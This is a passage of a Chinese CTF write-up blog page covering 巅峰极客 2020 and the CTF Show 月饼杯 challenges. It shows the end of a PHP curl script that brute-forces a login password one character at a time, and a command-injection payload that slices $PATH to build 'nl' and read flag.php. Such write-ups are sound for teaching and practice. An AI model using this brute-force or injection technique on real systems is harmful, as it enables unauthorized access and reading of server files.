&lt;= ASCII_END;<span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span> == <span class="number">95</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">//no &quot;_&quot; to be matched</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&#x27;.../login.php&#x27;</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$postData</span> = <span class="keyword">array</span>(<span class="string">&quot;password&quot;</span> =&gt; <span class="variable">$result</span> . chr(<span class="variable">$j</span>) . <span class="variable">$p</span>, <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;yu22x&quot;</span>);</span><br><span class="line">        <span class="variable">$postData</span> = http_build_query(<span class="variable">$postData</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$postData</span>);</span><br><span class="line">        <span class="variable">$outcontent</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>,CURLINFO_HTTP_CODE);</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        printf(<span class="string">&quot;Now j is %d,string is %s\n&quot;</span>,<span class="variable">$j</span>,<span class="variable">$result</span> . chr(<span class="variable">$j</span>) . <span class="variable">$p</span>);</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$outcontent</span>,<span class="string">&quot;I have filtered all the characters. Why can you come in? get out!&quot;</span>) || <span class="variable">$httpCode</span> == <span class="number">302</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> .= chr(<span class="variable">$j</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以得到密码为 <code>67815b0c009ee970fe4014abaa3Fa6A0</code>。</p>
+<p><strong>New Section</strong><br>使用环境变量截取出 <code>nl ????.???</code> 的指令读取 <code>flag.php</code>。</p>
+<blockquote>
+<p>1.1.1.1;${PATH:14:1}<n>$</n>{PATH:5:1} ????.???</p>
+</blockquote>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-2020"><span class="toc-number">1.</span> <span class="toc-text">巅峰极客 2020</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MeowWorld"><span class="toc-number">1.1.</span> <span class="toc-text">MeowWorld</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyflask"><span class="toc-number">1.2.</span> <span class="toc-text">babyflask</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF-Show-%E6%9C%88%E9%A5%BC%E6%9D%AF"><span class="toc-number">2.</span> <span class="toc-text">CTF Show 月饼杯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A4%E5%A4%9C%E5%9C%86"><span class="toc-number">2.1.</span> <span class="toc-text">此夜圆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%85%E4%BA%BA%E5%BF%83"><span class="toc-number">2.2.</span> <span class="toc-text">故人心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%AB%E8%B4%9F%E5%A9%B5%E5%A8%9F"><span class="toc-number">2.3.</span> <span class="toc-text">莫负婵娟</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&text=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&title=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&is_video=false&description=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=巅峰极客 2020 &amp; CTF Show 月饼杯&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&title=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&title=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&title=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&title=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&name=巅峰极客 2020 &amp; CTF Show 月饼杯&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/9b2fbf24.html&t=巅峰极客 2020 &amp; CTF Show 月饼杯"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="#">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="/zh-TW">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    湘ICP备20002800号
+    
+      <img src="/images/beian.png"/>
+      湘公网安备43021102000188号
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
